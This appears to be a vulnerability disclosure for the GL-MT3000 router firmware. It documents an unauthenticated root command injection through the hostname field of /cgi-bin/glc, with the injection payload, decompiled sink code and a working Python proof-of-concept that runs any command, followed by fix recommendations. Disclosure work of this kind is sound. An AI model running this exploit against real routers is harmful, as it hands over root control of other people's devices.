Submission Date: 2026.5.13
Vendor: GL-MT3000
Version: 4.4.5
Firmware: openwrt-mt3000-4.4.5-0811-1691754744.tar
Download Link: https://dl.gl-inet.cn/router/mt3000/stable


An unauthenticated command injection vulnerability exists in the `/cgi-bin/glc` endpoint. The `ovpn-client.so` shared object exports a `get_recommend_config` function that accepts a `servers` array. For each server entry, the `hostname` field is extracted, suffixed with `.tcp` or `.udp`, and passed to `download_recommend_config()`. This function constructs a shell command using `sprintf(cmd, "touch %s; curl -LsS --connect-timeout 35 -m 20 https://downloads.nordcdn.com/configs/files/ovpn_udp/servers/%s.ovpn > %s; rm -f %s", uuid_path, hostname, dl_path, uuid_path)` and executes it via `fork_exec(cmd)` (which invokes `/bin/sh -c`). No shell quoting or metacharacter filtering is applied to the hostname. An attacker can inject `$()` to execute arbitrary commands as root without authentication.

The reported vulnerable flow is:

```text
Unauthenticated attacker
  -> POST /cgi-bin/glc
     {"object":"ovpn-client", "method":"get_recommend_config",
      "args":{"group_id":1, "proto":0,
              "servers":[{"country_name":"US", "city_name":"Test",
                          "hostname":["$(id>/tmp/poc)"]}]}}

  -> /www/cgi-bin/glc
       dlopen("ovpn-client.so") → dlsym("get_recommend_config") → handler(args)

  -> ovpn-client.so::get_recommend_config
       // Gate 1: group_id must exist (default is 1)
       // Gate 2: ovpnclient must be disabled/stopped (default state passes)
       // Gate 3: flash space check
       
       for each server in servers:
           for each hostname in server.hostname:
               sprintf(hostname_tcp, "%s.tcp", hostname)
               download_recommend_config(hostname_tcp)

  -> ovpn-client.so::download_recommend_config(hostname_tcp)
       sprintf(uuid_path, "/tmp/curl_uuid/%s.ovpn", hostname)
       sprintf(dl_path,  "/tmp/ovpn_download/%s.ovpn", hostname)
       
       sprintf(cmd, "touch %s; curl -LsS --connect-timeout 35 -m 20 "
               "https://downloads.nordcdn.com/configs/files/ovpn_udp/servers/%s.ovpn > %s; rm -f %s",
               uuid_path, hostname, dl_path, uuid_path);
       fork_exec(cmd);   // 💣 /bin/sh -c

  -> /bin/sh -c:
       $(id>/tmp/poc) expanded BEFORE any command runs
       → id > /tmp/poc    ← 💣 RCE
```

The `download_recommend_config` sink — hostname is in 4 unquoted `%s` positions:

![image.png](image/image.png)

```c
// ovpn-client.so::download_recommend_config
sprintf(uuid_path, "/tmp/curl_uuid/%s.ovpn", hostname);
sprintf(dl_path,  "/tmp/ovpn_download/%s.ovpn", hostname);

// All 4 %s are hostname — $() fires in ALL positions:
sprintf(cmd, "touch %s; curl -LsS --connect-timeout 35 -m 20 "
        "https://downloads.nordcdn.com/configs/files/ovpn_udp/servers/%s.ovpn > %s; rm -f %s",
        uuid_path, hostname, dl_path, uuid_path);
fork_exec(cmd);   // /bin/sh -c
```

The `$()` injection mechanism — shell expands all substitutions before execution:

```text
Normal:  hostname = "us1234.nordvpn.com"
         → touch /tmp/curl_uuid/us1234.nordvpn.com.tcp.ovpn
         → curl .../servers/us1234.nordvpn.com.tcp.ovpn > ...
         ✅ legitimate download

Exploit: hostname = "$(id>/tmp/poc)"
         → touch /tmp/curl_uuid/$(id>/tmp/poc).tcp.ovpn   ← touch fails
         → curl .../servers/$(id>/tmp/poc).tcp.ovpn > ...  ← curl fails
         → $() executes FIRST — id > /tmp/poc               ← 💣 RCE
```

Confirmed proof on target device:

```text
curl -sk ... → 0 {}
cat /tmp/p17_reco → uid=0(root) gid=0(root)
```

![image.png](image/image%201.png)

```python
#!/usr/bin/env python3
import json, ssl, sys, urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://192.168.8.1"
CMD    = sys.argv[2] if len(sys.argv) > 2 else "id"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

req = urllib.request.Request(
    f"{TARGET}/cgi-bin/glc",
    data=json.dumps({"object":"ovpn-client","method":"get_recommend_config","args":{
        "group_id":1,"proto":0,
        "servers":[{"country_name":"US","city_name":"Test",
                    "hostname":[f"$({CMD} >/tmp/p17_reco 2>&1)"]}]}}).encode(),
    headers={"Content-Type":"application/json"}, method="POST")
print(urllib.request.urlopen(req, timeout=10, context=ctx).read().decode()[:200])
print("[+] check /tmp/p17_reco on target")
```

**Fix recommendations:**

| Priority | Component | Action |
|----------|-----------|--------|
| P0 | `ovpn-client.so` download_recommend_config | Replace `sprintf`+`fork_exec()` with `fork()`+`execv()` |
| P0 | `ovpn-client.so` get_recommend_config | Validate hostname against `^[a-zA-Z0-9][a-zA-Z0-9.-]+$` |
| P0 | `/www/cgi-bin/glc` | Add authentication and method allowlist |
